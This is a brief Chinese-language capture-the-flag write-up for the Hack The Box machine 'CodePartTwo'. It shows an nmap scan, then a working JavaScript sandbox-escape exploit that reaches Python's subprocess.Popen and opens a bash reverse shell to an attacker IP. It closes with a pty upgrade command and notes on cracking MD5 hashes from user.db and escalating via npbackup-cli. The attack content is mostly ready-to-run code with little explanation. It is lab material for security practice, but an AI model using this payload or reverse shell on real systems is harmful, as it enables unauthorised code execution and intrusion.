## 扫描
```BASH
┌──(kali㉿kali)-[~/Desktop/htb/CodePartTwo]
└─$ nmap -sT -Pn 10.10.11.82 -v
Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-09 23:08 EDT
Initiating Parallel DNS resolution of 1 host. at 23:08
Completed Parallel DNS resolution of 1 host. at 23:08, 0.05s elapsed
Initiating Connect Scan at 23:08
Scanning 10.10.11.82 [1000 ports]
Discovered open port 22/tcp on 10.10.11.82
Discovered open port 8000/tcp on 10.10.11.82
Completed Connect Scan at 23:10, 111.99s elapsed (1000 total ports)
Nmap scan report for 10.10.11.82
Host is up (0.99s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT     STATE SERVICE
22/tcp   open  ssh
8000/tcp open  http-alt

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 112.20 seconds
```

exp
```JS
let cmd = "bash -c 'sh -i >& /dev/tcp/10.10.16.64/23456 0>&1'; "
let hacked, bymarve, n11
let getattr, obj

hacked = Object.getOwnPropertyNames({})
bymarve = hacked.__getattribute__
n11 = bymarve("__getattribute__")
obj = n11("__class__").__base__
getattr = obj.__getattribute__

function findpopen(o) {
    let result;
    for(let i in o.__subclasses__()) {
        let item = o.__subclasses__()[i]
        if(item.__module__ == "subprocess" && item.__name__ == "Popen") {
            return item
        }
        if(item.__name__ != "type" && (result = findpopen(item))) {
            return result
        }
    }
}

n11 = findpopen(obj)(cmd, -1, null, -1, -1, -1, null, null, true).communicate()
console.log(n11)
n11
```

```
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

在user.db中发现存在账户名与密码，代码显示为md5加密

![](attachments/Pasted%20image%2020250910151713.png)


进入marco后发现存在npbackup-cli，可以连带执行命令

![](attachments/Pasted%20image%2020250910152045.png)

![](attachments/Pasted%20image%2020250910151837.png)
